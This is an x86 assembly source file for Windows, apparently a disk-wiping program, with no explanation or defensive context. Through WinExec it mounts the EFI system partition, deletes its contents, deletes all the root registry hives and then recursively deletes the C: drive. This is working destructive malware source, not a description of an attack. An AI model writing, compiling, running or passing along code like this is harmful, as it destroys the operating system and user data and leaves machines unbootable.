global _start
extern _WinExec@8
extern _ExitProcess@4

section .data
    cmd1 db "mountvol x: /s", 0
    cmd2 db "icacls x:", 0
    cmd3 db "icacls c:", 0
    cmd4 db "rd x: /s /q", 0
    cmd5 db "reg delete HKCR /f", 0
    cmd6 db "reg delete HKCU /f", 0
    cmd7 db "reg delete HKLM /f", 0
    cmd8 db "reg delete HKU /f: /s", 0
    cmd9 db "reg delete HKCC /f", 0
    cmd10 db "rd c: /s /q", 0

section .text
_start:
    push 1        ; SW_SHOWNORMAL
    push cmd1
    call _WinExec@8
    push 1
    push cmd2
    call _WinExec@8
    push 1
    push cmd3
    call _WinExec@8
    push 1
    push cmd4
    call _WinExec@8
    push 1
    push cmd5
    call _WinExec@8
    push 1
    push cmd6
    call _WinExec@8
    push 1
    push cmd7
    call _WinExec@8
    push 1
    push cmd8
    call _WinExec@8
    push 1
    push cmd9
    call _WinExec@8
    push 1
    push cmd10
    call _WinExec@8

    push 0
    call _ExitProcess@4
